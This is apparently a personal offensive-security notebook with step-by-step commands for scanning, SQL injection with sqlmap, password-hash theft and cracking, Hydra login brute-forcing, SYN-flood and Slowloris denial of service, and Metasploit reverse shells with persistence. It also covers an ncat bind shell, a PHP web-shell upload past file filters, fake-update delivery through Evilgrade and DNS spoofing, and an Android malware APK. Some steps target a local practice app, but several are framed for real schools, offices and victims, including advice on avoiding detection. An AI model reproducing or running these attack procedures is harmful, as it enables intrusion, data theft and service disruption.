+If the voice or email service being used does not run on https protocol then we will be able to see the mails sent of voice calls made, but that is unlikely.
+-----------------------------------------------------------------------------------------------
+NMAP:
+
+nmap -v scanme.nmap.org
+nmap -v [ip address / address range]
+
+We can also specify the ports. (-p)
+We can use a file containing a list of ip addresses (-iL)
+
+*Major ip blocks can be used to see who owns which ip addresses as in telecom companies or private networks.
+
+We can know the ip address of a websire or nameserver:
+nslookup [url]
+
+It also works in reverse:
+nslookup [ip address] --- will give us the domain name
+
+For detailed info on about an ip:
+curl ipinfo.io/[ip address]
+
+We can send the scan data to a file:
+
+nmap -oG - [ip address range/ url] -p [port no.] -vv > [path of file]
+ex.nmap -oG - 192.168.1.0-255 -p 22 -vv > /home/scan
+
+Getting scripts and libraries & installing them:
+
+To find the path on which nmap is scripts are stored :
+ls *.nse --- this command will locate all the .nse scripts and from the output we will get the path where .nse scripts are stored. In that path we will find two important directories. One is scripts and the other is nselibs.
+
+Go the nmap.org website and select any script that is to be istalled. Click on downlaw script to get the source code.
+In the scripts directory look for the script, if it already exists then use it, If it doesnt exist then, create a file in any text editor with the same name as the script--copy the source code--and save the file.
+
+Similarly get the required libraries for the scripts, check if they already exist. If not then create a file with same name in the nselibs directory and save them.
+
+Instructions on how to run the scripts using nmap will be specified in the section where you find the script.
+
+-----------------------------------------------------------------------------------------------
+SQL Injections:
+
+Start Damn Vulnerable Web App:
+service apache2 start
+service mysql start
+Open browser- 
+localhost/DVWA(folder name might be different)
+click sql injections(blind)
+
+There is a field to enter the user id and when we enter and submit, notice that whatever we entered appeared in the url after ?id=<whatever we entered>.
+In the real world we have to make the changes in the url directly as we wont have a textbox like we do in DVWA.
+
+Start Burp suit
+It will create a proxy for us which will help us to capture a session cokkie, which we can use with sqlmap.
+
+//If a website allows you to make a basic user then dont attack the login page as it might have many counter measures. Make a basic user and on many sites counter measures decrease after authentication. To do this we need a session id.
+
+Open burp suit,
+Go to proxy tab
+options
+set intercept to on --- this will intercept the data
+
+Go to browser 
+open the page required
+click edit-> preferences-> advanced-> network-> settings 
+manual proxy configuration
+enter the proxy and the port number (in this case we will use 127.0.0.1 and port 8080)
+Now reload the page, it wont reload until we go to burp suit and forward the packets (as intercept is on).
+
+Go to burp suit 
+actions-> copy url
+paste it in a text editor (if problem while pasting, then try again.)
+The intercept description will have a cokkie part, from there copy the part saying,
+PHPSESSID=<something> 
+copy that part and put it somewhere. This is the session cookie id which we will use for our injection.
+Close burp suit
+
+In terminal run sqlmap:
+sqlmap -u "[url captured]#" --cookie="security=[low/medium/high/impossible]; [PHPSESSID=<something obtained from burp>]"
+
+ex.sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=3333&Submit=Submit&user_token=94d140c3f89c3d03e03e64b8d6988295#" --cookie="security=impossible; PHPSESSID=0dfgogr1msmgs6hlkfm8i13vi2"
+
+sqlmap will run and if it finds vulnerabilities, it will ask whether you want to scan further even if vulnerabilities are found. Read the question and see what you need, depending on your requirement.
+If no vulnerabilites are found or some are but injection wont work then change the security from impossible to low, if a problem arises in injecting also do the same thing.
+
+Once you are through this stage and get the vulnerabilities, you can access all the databases, tables in those dbs, etc. Go through all databases and tables, cause you never know how someone named them and what is the value of the information stored in them, until you open and check them.
+
+Getting the names of available databases:
+sqlmap -u "[url captured]#" --cookie="security=[low/medium/high/impossible]; [PHPSESSID=<something obtained from burp>]" --dbs
+
+ex.sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=3333&Submit=Submit&user_token=94d140c3f89c3d03e03e64b8d6988295#" --cookie="security=low; PHPSESSID=0dfgogr1msmgs6hlkfm8i13vi2" --dbs
+
+In the following commands we can add a --threads option to run sqlmap in multi thread mode and increase the speed of information retrieval.
+
+-Shows tables in a particular db:
+sqlmap -u "[url captured]#" --cookie="security=[low/medium/high/impossible]; [PHPSESSID=<something obtained from burp>]" -D [database name] --tables
+
+ex.sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=3333&Submit=Submit&user_token=94d140c3f89c3d03e03e64b8d6988295#" --cookie="security=low; PHPSESSID=0dfgogr1msmgs6hlkfm8i13vi2" -D mysql --tables
+
+-Shows list of columns in a table: (may be zero if table is empty)
+sqlmap -u "[url captured]#" --cookie="security=[low/medium/high/impossible]; [PHPSESSID=<something obtained from burp>]" -T [table_name] --column
+
+ex.sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=3333&Submit=Submit&user_token=94d140c3f89c3d03e03e64b8d6988295#" --cookie="security=low; PHPSESSID=0dfgogr1msmgs6hlkfm8i13vi2" -T users --column
+
+-Dumps the information in the columns selected on the screen:
+sqlmap -u "[url captured]#" --cookie="security=[low/medium/high/impossible]; [PHPSESSID=<something obtained from burp>]" -C [column_name],[column_name],..... --dump
+
+ex.sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=3333&Submit=Submit&user_token=94d140c3f89c3d03e03e64b8d6988295#" --cookie="security=low; PHPSESSID=0dfgogr1msmgs6hlkfm8i13vi2" -C users,password --dump
+
+It may ask "do you want to store hashes to a temp file(y/n)?". The passwords are generally stored as hashes and so this option allows us to store those hashes for further processing, or cracking.
+If the password is hard and strong, cracking it will be tough. If it is an easy password then we may crack them.
+
+In case we dont save the hashes in a file,  we will still have the option to crack them via a default dictionary in sqlmap. It prompts us with such a question. Upon choosing yes,  we will have to choose a dictionary,  we can use the default one or a custom dictionary or enter a file with a list of dictionaries.
+------------------------------------------------------------------------------------------------
+Brute Forcing Methods:
+
+Decrypting hashes using Findmyhash:
+
+findmyhash [type of encryption] -h [hash]
+
+ex. findmyhash MD5 -h 6057f13c496ecf7fd777ceb9e79ae285
+
+We can create a hash on the internet by using a site like md5lab.com or some other website.
+Or we can crack hashes we found in the databases of the websites by doing sql injections. Most databases use MD5 encryption as it is very popular.
+
+To search the hash online:
+Copy the hash into a search engine.
+
+Or
+findmyhash -g [hash]
+
+Can also crack a hashkey online by searching it online or in sites like md5lab.com which have options for has cracking.
+
+
+Gaining root access on a linux system:
+
+If you are on a user which does not have root access in the system then we can gain the root access :
+Reboot the system
+when the boot menu appears see the option for editing the commands before booting
+In kali linux it is e, it may be diffrent in different os.
+
+Go to a line with echo 'Loading linux...."
+Below it is a line which has a long number, and after the number ends it says ro
+Change the ro to rw. 
+Then go to the end of the line press space and type init=/bin/bash
+Now see the option to boot, it is f10 in kali. 
+The system will boot and you will get a terminal with root access.
+
+cd /home/[user]
+passwd [user]
+ex.passwd root --- press enter
+you will be asked for the new password for the root user 
+Now turn off the computer. If command for shutdown doesnt work, then power off physically.
+
+When the system reboots you can check that the commands you edited have been reset, so if you make any mistakes , just poweroff the system.
+
+Linux stores it hashes in the file etc/shadow.
+We can open this file and try to decrypt the hashes. But inorder to gain access to this file we need root privilages.
+
+unshadow etc/passwd etc/shadow > [filename]
+
+cat [file name]
+
+We can get hashes of users and othe accounts here.
+
+Using John the Ripper:
+john --help
+
+john [filename created using unshadow]
+
+to see results
+john --show [filename created using unshadow]
+
+john can be used for many other password cracking methods
+
+Windows password cracking:
+
+We can collect hashes of the machines running windows and we break them elsewhere.
+If we have user credentials then we can access that computer by being on the same lan.
+This method is used to control the systems of a school or office as bots and carry out various kinds of activity. 
+
+Open browser
+go to www.openwall.com
+find and download latest version for pwdump 7 or later.
+download john the ripper latest community enhanced version.(req only if we want to crack the hashes on the windows machine itself)
+make a folder in the root directory make a folder and unzip both files to this location.
+Open cmd as administrator
+use dir insted of ls
+go to the folder in root directory where you extracted both john the ripper and pwdump7
+ex. cd pass\pwdump7\
+PwDump7.exe > [filename.txt]
+
+this will give us a file with usernames and hashes
+we can break them using john on the windows system itself or take them and break on our linux system.
+
+
+Using Hydra (attack websites which have a login form):
+
+It works regardless of the protocol. Works both on http and https
+
+-t is option for setting for no. of threads....default is 16, do not issue a lot of them or it may raise flags. 
+ 
+hydra --help
+read the help, its small and easily understandable.
+The -U option mentioned can be used to enter the services provided in hydra.
+Below the options menu we will also have the Supported services and syntax to use them. For a website login we can see the http[s]-[get|post]-form. 
+
+hydra -U [module name]
+ex. hydra -U http-post-form
+This will print the syntax and the options that we can use while running this particular module.
+Read through it, to get the syntax right as hydra is very picky about syntax.
+
+Go to the web page with a login form you wish to exploit, right click to view source.
+See the source code and find the username and password fileds there. We will need the names of those fields present inside the html code.
+
+-t is option for setting for no. of threads....default is 16, do not issue a lot of them or it may raise flags. 
+
+While attacking websites in order to brute force login forms, we need to know whether GET or POST is being used. This can be done in three ways.
+Firstly we could simply see the page source and from the login form we can figure out whether the method is GET or POST.
+Secondly we could type in any random username and password. After clicking the submit button, if the credentials are not passed in the url space of the browser then it is POST, but if the credentials appearn in the url then it is GET.
+Thirdly, we could also find it by using BURP suit. Do a random login, intersept the traffic and you will see it in the contents. Get the cokkie information from BURP as well. Copy the url on the top line after the get/post method.
+
+hydra -l [] -P [] [server ip] [module name]"[url clip]:[name of username filed]=^USER^&[name of password filed]=^PASS^&[name of submit button]=[message that says login failed]" -V 
+
+ex.hydra -l admin -P passlist 192.168.1.101 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&login=Login:Login failed" -V
+
+Or we could do-
+
+hydra [server ip] -V -L [path of file with username list] -P [path of file with password list]  [module name] "[url clip]:[name of username filed]=^USER^&[name of password filed]=^PASS^&[name of submit button]=Login:F=[login fail message]:H=Cookie: PHPSESSID=[whatever the cookie id is]; security=low"
+
+ex. hydra 127.0.0.1 -V -L /Desktop/usernames.txt -P /Desktop/passwords.txt  http-get-form "DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=4th2ai5asdhasdbxgsxsdeysq; security=low"
+
+We will not require a php cookie if we are attacking a standalone form. But if we are trying to gain access to the admin password of the system, then the smarter thing to do is first register as a regular user then brute force a form inside the portal, this is where the cookie comes in.
+
+We can use only one word from the error message as well, which is generated upon incorrect login.
+This example was done for a get method page. if website being attacked uses post method then use post.
+The message of login failed is important as hydra looks for it and when it finds this message hydra will know that the credentials are wrong. Try getting the parameters right or hydra will not work properly.
+
+Each colon is a separation of a field. url was one filed, login form was the secind and finally the message was the thord.
+We can get the last two parametes by using burpsuit easily, it appears in the last lines of burp suit content
+
+-----------------------------------------------------------------------------------------------------
+Denial of Service: (attacking a web server)
+
+Using hping:
+Program to flood a web server 
+
+hping3 --help
+
+hping3 -i u[time interval] -S -p [port_no.] [ip address of server being attacked]
+
+ex. hping3 -i u100 -S -p 80 192.168.1.1 
+
+-S is for syn attack, we can try various other types of attacks, so check out the help for more types of attacks.
+
+Doing a Slowloris attack with nmap:
+
+Slowloris dos's a server, it doesnt work completely all the time but at the very least it decreases the speed of server and makes it lag.
+
+Go to the nmap website and in the 'dos' category you will find the slowloris script. Its name is http-slowloris.
+
+nmap will scan the server we choose for the slowloris vulnerability.
+
+Run nmap:
+nmap --script http-slowloris --max-parallelism [no. of max paralleles] [ip address of the server] -vv 
+
+ex. nmap --scripts http-slowloris --max-parallelism 400 192.168.1.1 -vv
+
+Go to http://ha.ckers.org/slowloris for details about slowloris attack, see list of web servers that are vulnerable to this type of attack.
+Download slowloris.pl, two versions are available, ipv4 and ipv6.
+
+The script will pop up on a page,  copy the code, paste it in a file with extention pl
+
+nano slowloris.pl
+paste code and save the file.
+Make it executable-
+chmod +x slowloris.pl
+
+Run the slowloris dos attack:
+./slowloris.pl -dns [ip address of web server] -port [port number preferably 80] -num [no. of threads]
+
+ex. ./slowloris.pl -dns 192.168.1.1 -port 80 -num 500
+
+---------------------------------------------------------------------------------------------------
+Reverse Shells:
+
+Using Metasploit:
+
+Reverse shell is a piece of code that we can place on a device and gain access to that device, through the shell.
+We will create these shells using Metasploit.
+
+Metasploit:
+I can run withut any configuration, but it will work much faster if we use a database.
+
+Give metasploit a db:
+service postagresql start
+
+Start metasploit:
+service metasploit start
+
+Update metasploit frame work:
+msfupdate --- do this regularly as they issue weekly uodates. By updating the metasploit framework we have a better chance of creating a reverse shell that can bypass a firewall or any other opstacles.
+
+Start the console:
+mfconsole
+This gives us a metasploit prompt
+
+msf> db_rebuild_cache
+
+if this command doesnt work then the db we setup was unsuccessful. In that case close the console, restart the system and start again. It breaks sometimes.     
+
+Search:
+msf> search name:meterpreter
+shows various payloads we could execute
+
+
+Open more than one terminal, Open msfconsole on one of them.
+
+Create a file with the payload in it:
+msfpayload [path and name of payload] LHOST=[listening host ip address (generally your own ip address)] x > [path and file name] 
+
+ex. msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.102 x > /root/desktop/CMD.exe
+
+note: extention of the file should be the same as an executable file in the OS we want to place it on. We will be placing this CMD.exe file on any target windows machine, and once it is running we will be able to listen by using the payload handler.
+
+In the msfconsole tpye:
+msf> use exploit/multi/handler --- this enables us to use the exploit handler.
+
+To see options:
+show options.
+
+To set the payload:
+set payload windows/meterpreter/reverse_tcp
+
+Again check the options to see what you can do.
+We can configure the LHOST and LPORT here,
+
+Change LHOST(listening host):
+set LHOST [your external or internal ip address]
+
+set LPORT(listening port):
+set LPORT [new port no.] 
+we can leave the LPORT as default
+
+type show optios again to see that the changes took place successfully or not.
+
+Starting the payload handler:
+msf exploit(handler)> exploit
+
+this will start the payload.
+
+Once the payload file is running on the target computer, under the payload handler, the meterpreter prompt opens. 
+
+To open command prompt of the target machine:
+meterpreter > shell
+
+This will give us access to the command line(or terminal) of the target computer. Type in exit to quit terminal.
+
+In case the payload we planted in the target computer is running (once the payload is made persistent, it will always run when the target system boots). We can simply start mfconsole in our system, open the exploit handler and check if the payload is running.
+
+To check if any of the payloads delivered are running:
+sessions -l  
+
+To enter a session which is running:
+sessions -i [id seen in output of above command]
+
+Check sessions -help
+
+Putting the meterpreter session into background:
+meterpreter > background
+
+Escalating privilages of the reverse shell:
+
+Shows post exploitations:
+use post/windows --- Gives a list of post exploitations.
+
+To look for exploits that escalate privilages:
+use post/windows/escalate/ --- shows explots that can be used for escalations of privilages.
+
+One of the best way to get escaletd privilage permission, is to ask the user itself. For doing this we can use an exploit called ask:
+ 
+use exploit/windows/local/ask 
+
+We will enter the exploit and can now use it to ask the user to grant privilages.
+
+show options
+
+Now see the session running, by default it is set to 1. 
+
+We can change it to any running session we want by:
+set sesion [session id]
+
+To ask the user for escalating privilages:
+exploit
+
+If user accepts our request, we will get the system privilages, and another  meterpreter session will be opened. This new session will have escalated privilages. The new session will be automatically opened.
+
+
+Making the reverse shell persistent:
+
+Use the meterpreter session which has gained escalated privilages.
+
+run persistence -h --- will open help menu for persistence script.
+
+To automatically start the agent when the system boots:
+run persistence -X
+
+*From this point on you are in control of the system.
+
+Using NetCat:
+
+Used to make reverse shells and other required connections. Also known as a swiss knife of reverse shells.
+Can also be used to make a peer to peer connections, we can make chat rooms and ssl encrypt the traffic, communicate with other systems, etc.
+
+ncat --help
+
+
+To listen on a particular port and grant access to other system: 
+ncat -v -l -p [any port that is not in use] -e /bin/bash
+will send everything it listens to the terminal.
+
+On other system computer: 
+ncat [ip of listening system] [listening port no.]
+
+This will open a shell which lets the other systems to access a command line of the listening system 
+
+lsof -i :[port no.] --- shows which processes are using that port.
+
+Communicating with another linux system:
+
+To listen on a particular port : 
+ncat -v -l -p [any port that is not in use] 
+
+On the other system:
+ncat [ip adress of system we want to connect to] [port it is listening on]
+ex. ncat 192.168.1.102 8080
+
+This will start a two way text communication between the systems. Whatever you type in one terminal will appear on the other.
+
+To make the communication channel encrypted, on both the previous commands add --ssl
+
+ex. ncat --ssl -v -l -p 8080
+on second system-
+ex. ncat 192.168.1.102 8080
+
+To listen to more than one system:
+ncat -v -l -k -p 8080  
+
+Uploading a reverse shell on a Web Server:
+
+We will need to figure out which version of php is being used on the server. It can be done by:
+nmap -sV --script=http-php-version [ip of target website]
+
+We can find this script on the nmap website. Download it before running the scan.
+
+Download php reverse shell from pentestmonkey.net
+extract the downloaded file. Copy the php-reverse-shell.php file to any directory convinient for you.
+
+Rename the php-reverse-shell.php file to something like "image.php\00.jpg". The \00 is a null byte and may not be needed in all versions of php, only the ones vulnerable to it.
+Open the payload file using nano, nano image.php\00.jpg and change the ip and the port. 
+
+Web servers have multiple filters which prevent us from uploading mallicious files, so we need to change the extention of our payload and make it .jpg cause most websites have sections to upload data, especially pictures.
+
+Run burpsuit as you upload the payload, set intersept as on. and analyze the packet before you forward it.
+In the Raw section we will have filename="name_of_our_payload.php\00.jpg"
+From here remove the jpg and make it filename="name_of_our_payload.php"
+Now forward the request. The file will be uploaded.
+
+In terminal, run netcat
+ncat -v -l -p [port no. specified in payload] 
+
+When the file is uploaded we will get the folder in which it was saved(in DVWA). Copy & paste that address into the url and hit go. Turn off burpsuit or forward the packets.
+
+Now we have a reverse shell in place.
+
+--------------------------------------------------------------------------------------------------
+Evilgrade (sending the payload as a fake update):
+
+Using evilgrade we can send a payload to the target computer as a fake update. The user will receive it as an update and install the payload giving us full access to the system.
+
+1> Create the payload (backdoor):
+msfpayload windows/meterpreter/reverse_tcp LHOST=[your ip] LPORT=[listening port] X > [filename].exe
+ex. msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 X > backdoor.exe
+
+2> Listen for connections:
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.101
+set LPORT 5555
+show options --- to verify that everything was entered correctly
+exploit
+This will start and wait listen for a connection. As soon as the payload file is active, we will have comnplete access of the system from here.
+
+3> Start evilgrade server to serve fake update:
+evilgrade --- this will start the evilgrade prompt
+show modules --- will display modules of all available softwares whose updates can be spoofed
+configure [modulename]
+ex. configure dap
+show options
+Take whatever url is in the VirtualHost parameter and place it in the "etter.dns" file, so that if the program looks for an update it will be spoofed by our system and served the payload instead.
+ex. if VirtualHost = "(update.speedbit.com)"
+In etter.dns file add a rule, update.speedbit.com A 192.168.1.101(your ip)
+Now, 
+set agent [path of backdoor file created]
+ex. set agent /root/backdoor.exe 
+show options --- to verify that the agent is set correctly
+Finally,
+start --- this will start the evilgrade server.
+
+4> Start DNS spoofing:
+ettercap -Tq -M arp:remote -i wlan0 -P dns_spoof /[target AP ip]/ /[target system ip]/
+ex.ettercap -Tq -M arp:remote -i wlan0 -P dns_spoof /192.168.1.1/ /192.168.1.69/
+
+5> Enable IP forwarding:
+echo 1 > /proc/sys/net/ipv4/ip_forward 
+
+After all this is set, when the user updates the application we are set to spoof, instead of the update he/she will install the payload file giving us accesss to the system.
+We can now make the payload persistent and listen to the connections from the backdoor. 
+
+-----------------------------------------------------------------------------------------------------
+Wi-fEye:
+
+This tool lets us do all the wireless attacks without having to specify each command separately.
+
+Download Wi-fEye:
+http://wi-feye.isecur1ty.org/download.php
+
+Install Wi-fEye:
+Go to the directory where Wi-fEye is located
+python install.py
+
+Run Wi-fEye:
+Go to the directory where Wi-fEye is located
+python Wi-fEye.py
+
+It shows list of wireless interfaces.
+Select the one you wish to use by entering the number assigned to the wireless interface.
+
+After selecting the interface it will ask you for the mac id of the wifi interface we entered.
+Upon entering the mac address of the selected wifi interface, the program runs and shows us the main menu.
+We can now use the kinds of options available to carry out Cracking,MITM or other types of attacks.
+
+Simply choose an option to carry out any attack you want!
+
+----------------------------------------------------------------------------------------------------
+
+Android device attacks:
+
+*This kind of attack will only be success full if the victim installs the apk on the device
+
+Creating payload:
+
+Start Metasploit
+use msfvenom (used to setup a payload)
+The -p option is for creating a payload file
+LHOST = pubilc/local ip address where you want the payload to report back to
+LPORT = 3433/ 4444 use any unused port, using common ports may be dangerous as they are open most of the time.
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST = 192.168.0.1 LPORT = 4444 > malware.apk (choose any name)
+
+* While creating payloads try to encrypt them using vail evasion. Works well on windows but android was not out when written.
+
+Handling payload once executed:
+
+Start Metasploit
+
+use exploit/multi/handler
+
+set payload android/meterpreter/reverse_tcp
+
+set lhost = <same ip as used before>
+set lport = <same port as used before>
+
+expolit
+
+
+
+
